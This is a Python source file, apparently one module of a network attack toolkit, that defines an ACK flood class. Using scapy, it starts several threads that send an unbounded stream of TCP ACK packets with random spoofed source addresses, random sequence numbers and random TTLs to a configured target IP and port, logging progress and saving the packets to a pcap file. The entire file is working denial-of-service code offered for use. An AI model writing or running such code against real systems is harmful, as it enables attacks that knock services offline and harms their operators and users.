import random, threading
from scapy.all import Ether, IP, TCP, sendp, get_if_hwaddr, RandShort
from attacks.base import BaseAttack


class AckFlood(BaseAttack):
    def run(self):
        target_ip   = self.params.get("target_ip", "")
        target_port = int(self.params.get("target_port", 80))
        threads_n   = int(self.params.get("threads", 4))

        if not target_ip:
            self.log("ACK Flood: no target IP", "error"); return

        dst_mac  = self.resolve_mac(target_ip)
        src_mac  = get_if_hwaddr(self.iface)
        writer   = self.open_pcap()
        counters = {"sent": 0}
        lock     = threading.Lock()

        self.log(f"TCP ACK Flood → {target_ip}:{target_port} ({threads_n} threads)", "warn")

        def sender():
            while not self._stop.is_set():
                spoof = (f"{random.randint(1,254)}.{random.randint(0,254)}."
                         f"{random.randint(0,254)}.{random.randint(1,254)}")
                pkt = (
                    Ether(src=src_mac, dst=dst_mac)
                    / IP(src=spoof, dst=target_ip, ttl=random.randint(32, 128))
                    / TCP(sport=RandShort(), dport=target_port,
                          flags="A",
                          seq=random.randint(0, 0xFFFFFFFF),
                          ack=random.randint(0, 0xFFFFFFFF))
                )
                try:
                    sendp(pkt, iface=self.iface, verbose=False)
                    with lock:
                        self.write(pkt)
                        counters["sent"] += 1
                        n = counters["sent"]
                    if n % 500 == 0:
                        self.log(f"ACK Flood: {n:,} packets sent", "info")
                except Exception as e:
                    self.log(f"ACK Flood error: {e}", "error"); break

        workers = [threading.Thread(target=sender, daemon=True) for _ in range(threads_n)]
        for w in workers: w.start()
        for w in workers: w.join()
        writer.close()
        self.log(f"ACK Flood stopped — {counters['sent']:,} total packets", "success")
